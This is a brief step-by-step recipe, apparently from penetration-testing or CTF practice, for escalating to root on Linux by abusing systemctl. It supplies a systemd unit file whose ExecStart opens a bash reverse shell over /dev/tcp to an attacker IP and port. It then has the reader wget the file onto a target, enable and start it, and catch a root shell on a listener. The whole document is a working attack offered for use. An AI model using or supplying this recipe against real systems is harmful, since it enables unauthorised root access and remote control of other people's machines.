1.) create a service file naming it whatever you want (something like root.service or pbot.service)
2.) copy and paste the following into the file:

[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'

[Install]
WantedBy=multi-user.target

3.) make sure to change your ip and port you want to listen to in this script
4.) save the file
5.) start a python server and wget it onto the target machine. tmp directory if you are a low priv user like www-data
6.) once the file is on the target machine start a listener on your machine on the port you entered into root.service
7.) back on the target machine enter:

/bin/systemctl enable /tmp/root.service (the path is only relevant if you uploaded root.service in the tmp directory)
	- you should get a response like this: Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/tmp/root.service
8.) get yourself a root shell by entering:

/bin/systemctl start root

9.) you should now have a root shell on your listener!!!!
